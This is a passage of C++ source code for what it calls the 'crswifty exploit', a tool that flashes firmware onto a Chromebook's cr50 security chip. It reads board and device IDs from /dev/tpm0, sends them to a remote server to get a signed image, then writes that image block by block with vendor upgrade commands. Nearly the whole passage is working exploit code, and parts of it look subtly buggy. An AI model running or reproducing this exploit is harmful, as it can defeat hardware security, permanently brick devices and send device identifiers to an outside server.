		fwTypeEnum = RW;
	};
	return fwTypeEnum;
}
#define SECONDS(x) x * 1000000
int main(int argc, char **argv)
{
	// printf("%d", argc);
	int opt;
	char *optstring = "f:d:s:t:l";

	int opt_index;
	const char *cr50Fw = NULL;
	bool fwFileProvided = false;
	string tpmDev = "/dev/tpm0";
	// int tpmDevLen = sizeof(tpmDev);

	while ((opt = getopt_long(argc, argv, optstring, longopts, &opt_index)) != -1)
	{
		switch (opt)
		{
		case 'f':
		{
			cr50Fw = strdup(optarg);

			break;
		}
		case 'd':
		{ // There are some crazy chromebooks, accept custom tpm devices, especially for emulators.
			// tpmDevLen = strlen(optarg);
			tpmDev.assign(optarg);
			// tpmDevLen = strlen(tpmDev);
			break;
		}
		case 's':
		{
			imageSigningServer = strdup(optarg);
			break;
		}
		case 't':
		{
			fwType.assign(optarg);
			break;
		}
		case 'l':
		{
			// lockImageOpt.assign(optarg);

			lockImage = true;

			break;
		}
		default:

			break;
		}
	}

	if (!cr50Fw)
	{
		usage(argv[0]);
		return -1;
	}

	printf("[Terms]:\nBefore you start the exploit, please confirm that you own this device, and are authorized to execute this binary. (Note: this may brick your computer, proceed with caution). \n\n[Privacy policy]: Your H1 devids are sent a server with logging disabled. We will not store your H1 devids on our servers.\n"
		   "If you do not accept any of the terms, or don't own this device, please press Ctrl-C in 5 seconds. We are not responsible for any damages caused by this exploit.\n");
	usleep(5000000);
	printf("Your device will reboot multiple times. KEEP YOUR USB/SD CARD PLUGGED IN. Interrupting the crswifty exploit WILL cause permanent bricks.\n");
	printf("STAGE 1: Getting access to the cr50 device!\n");

	int tpmdev;
	tpmdev = open(tpmDev.c_str(), O_RDWR);

	printf("Accepting firmware image\n");
	if (tpmdev < 0)
	{
		printf("TPMDEV: %s\n", strerror(errno));
		printf("Couldn't access %s\nExiting :(\nTry running as root!\n", tpmDev.c_str());

		return 1;
	}
	size_t cr50FwLength = 0;
	uint8_t *cr50FwData = NULL;
	if (!sysinfo_only)
	{
		cr50FwLength = 0;
		cr50FwData = readFileOrDie(cr50Fw, &cr50FwLength);
	}

	printf("Sizeof Firmware: %lu", cr50FwLength);
	// uint16_t gbbFlags = (uint16_t)strtoul(argv[2], &data, 16);

	// int standard_out = open("/dev/stdout", O_RDWR);

	printf("Successful!\nConnecting to tpm (CR50) now...\nGetting board id...\n");
	char requestBuffer[1024 + sizeof(upgrade_command)];
	memset(requestBuffer, 0, sizeof(requestBuffer));
	char responseBuffer[sizeof(first_response_pdu) + 2048];
	memset(responseBuffer, 0, sizeof(responseBuffer));
	size_t responseSize;
	// Getting board id, so we can patch it in the image signer server

	struct vc_board_id bid;

	memset(&bid, 0, sizeof(bid));
	size_t resp_size = 0;
	send_vendor_command(tpmdev, VENDOR_CC_GET_BOARD_ID, &bid, 0, &bid, &resp_size);
	// printf("Board ID Type: 0x%x", bid.type);

	struct sysinfo_s si;
	memset(&si, 0, sizeof(sysinfo_s));

	send_vendor_command(tpmdev, VENDOR_CC_SYSINFO, NULL, 0, &si, &resp_size);

	upgrade_command uc;
	uc.block_base = 0;
	uc.block_digest = 0;
	memcpy(requestBuffer, &uc, sizeof(upgrade_command));
	send_vendor_command(tpmdev, EXTENSION_FW_UPGRADE, requestBuffer, sizeof(upgrade_command), responseBuffer, &responseSize);
	if (responseSize != sizeof(first_response_pdu))
	{
		printf("An error has occurred: Unable to obtain the first_response. Response size: %d\n", responseSize);
		return -1;
	}
	first_response_pdu *fpdu = (first_response_pdu *)responseBuffer;

	if (fpdu->protocol_version < 5)
	{
		printf("Your chromebook is tooooo old. Make sure your device isn't EOL and update your chromebook.\n");
		exit(-1);
	}
	version_image vi = {
		be32toh(fpdu->shv[0].epoch), be32toh(fpdu->shv[0].major), be32toh(fpdu->shv[0].minor)+1 // Endianness

	};
	if (sysinfo_only)
	{

		int devid_len = snprintf(NULL, 0, "%X:%X", si.dev_id0, si.dev_id1);
		char *devidstr = new char[devid_len + 1];
		sprintf(devidstr, "%X:%X", si.dev_id0, si.dev_id1);
		uint32_t header_board_id_type = bid.type ^ SIGNED_HEADER_PADDING;
		uint32_t header_board_id_mask = 0xFFFF ^ SIGNED_HEADER_PADDING;
		uint32_t header_board_id_flags = bid.flags ^ SIGNED_HEADER_PADDING;
		int bid_len = snprintf(NULL, 0, "%X:%X:%X", header_board_id_type, header_board_id_mask, header_board_id_flags);
		char *bid_str = new char[bid_len + 1];
		sprintf(bid_str, "%X:%X:%X", header_board_id_type, header_board_id_mask, header_board_id_flags);

		int vi_len = snprintf(NULL, 0, "%d.%d.%d", vi.epoch, vi.major, vi.minor);
		char *vi_str = new char[vi_len + 1];

		sprintf(vi_str, "%d.%d.%d", vi.epoch, vi.major, vi.minor);
		printf(
			"DEV_ID: %s\n"
			"BOARD_ID: %s\n"
			"VERSION: %s\n",
			devidstr,
			bid_str, vi_str);
		delete[] devidstr;
		delete[] bid_str;
		delete[] vi_str;
		// return;

		return 0;
	}
	// Assume the image is presigned, and if offline mode is disabled get it from server
	url_response signed_image = {
		cr50FwLength,
		cr50FwData,
		200};

	if (!offline_flag)
	{
		signed_image = getSignedImageFromServer(&bid, si.dev_id0, si.dev_id1, cr50FwData, cr50FwLength, vi);
	}
	printf("IMAGE SIGNING SUCCESS!\n");
	SignedHeader *signed_image_header = (SignedHeader *)signed_image.body;
	printf("Version from signed image: %d.%d.%d\n", signed_image_header->epoch_, signed_image_header->major_, signed_image_header->minor_);

	const char *partitionStr = "A";

	if (fwTypeEnum == RW)
	{
		partitionStr = fpdu->backup_rw_offset == CONFIG_RW_MEM_OFF ? "A" : "B";
	}
	printf("\n\nSending signed image to %s_%s.\n",
		   (fwTypeEnum == RW) ? "RW" : "RO",
		   partitionStr);

	printf("\n\nDO NOT UNPLUG YOUR SD/USB DRIVE DURING THE IMAGE TRANSFER. YOUR SYSTEM WILL BRICK!\n");

	int blocksToSend = signed_image.bodySize / 1024L;
	int block_base = be32toh(fwTypeEnum == RW ? fpdu->backup_rw_offset : fpdu->backup_ro_offset);
	if (verbose_flag)
	{
		printf("\n\nBlocks to send: %d\nBlock sizes: 1024\n", blocksToSend);
	}
	upgrade_command up1;
	printf("Flashing to cr50 firmware. will take around 5 minutes\n");
	for (int i = 0; i < blocksToSend; i++)
	{
		int block_off = i * 1024;
		int block_size = MIN(signed_image.bodySize - block_off, 1024);
		memset(requestBuffer, 0, sizeof(requestBuffer));
		up1.block_base = block_off + block_base;
		unsigned char hash[SHA_DIGEST_LENGTH];
		SHA1(signed_image.body + block_off, signed_image.bodySize - 32L, hash);

		up1.block_digest = ((uint32_t *)(hash))[0];
		up1.block_base = block_base + block_off;
		memcpy(requestBuffer + offsetof(upgrade_command, block_base), signed_image.body + block_off, block_size);
		size_t size;
		send_vendor_command(tpmdev, EXTENSION_FW_UPGRADE, requestBuffer, offsetof(upgrade_command, block_base) + block_size, responseBuffer, &size);
		if (responseBuffer[0] != UPGRADE_SUCCESS)
		{
			printf("An error has occured: %s, quitting!\n", upgrade_error_str[responseBuffer[0]]);
			exit(-1);
		}

		if (verbose_flag)
		{
			// Notify the user how much is sent.
			printf("\e[2K\e[0GSent %d/%d (%4f%)", block_off + 1024, block_size, 100 * ((double)block_off / (double)block_size));
		}
		usleep(SECONDS(60));
	}
	printf("\n");
	uint32_t seconds = 5;
	while (1)
	{
		if (seconds == 1)
		{
			*((uint16_t *)responseBuffer) = 1000; // 1 seconds
			size_t size;
			send_vendor_command(tpmdev, VENDOR_CC_TURN_UPDATE_ON, requestBuffer, sizeof(uint16_t), responseBuffer, &size);
		}
		if (seconds == 0)
		{
			break;
		}
		usleep(SECONDS(1));
		seconds -= 1;
	}
	printf("Cleaning up!\n");
	close(tpmdev);

	return 0;
}
